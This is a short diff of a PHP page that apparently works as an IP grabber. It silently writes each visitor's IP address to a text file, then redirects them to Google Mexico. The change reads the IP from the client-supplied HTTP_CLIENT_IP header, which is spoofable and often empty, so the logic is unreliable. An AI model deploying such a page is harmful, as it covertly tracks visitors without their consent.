@@ -4,8 +4,8 @@
 </head>
 </html>
 <?php
-$ip = $_SERVER['REMOTE_ADDR'];
-file_put_contents("ip", $ip);
+$ip = $_SERVER['HTTP_CLIENT_IP'];
+file_put_contents("ip.txt", $ip);
 header("location: http://www.google.com.mx");
 die();
 ?>
